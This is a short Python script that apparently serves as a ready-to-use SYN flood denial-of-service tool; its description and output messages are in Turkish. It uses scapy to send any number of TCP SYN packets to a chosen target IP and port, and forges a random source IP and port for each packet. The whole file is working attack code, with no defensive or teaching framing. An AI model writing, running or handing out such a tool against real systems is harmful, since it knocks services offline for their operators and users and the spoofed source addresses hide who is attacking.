import argparse
import random
from scapy.all import *
from colorama import init, Fore

init(autoreset=True)

def syn_flood(target_ip, target_port, packet_count):
    for i in range(packet_count):
        src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(packet, verbose=False)
        print(Fore.GREEN + f"[+] Paket gönderildi {i+1}/{packet_count}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood DOS Aracı")
    parser.add_argument("ip", type=str, help="Hedef IP")
    parser.add_argument("port", type=int, help="Hedef Port")
    parser.add_argument("count", type=int, help="Paket Sayısı")

    args = parser.parse_args()
    syn_flood(args.ip, args.port, args.count)
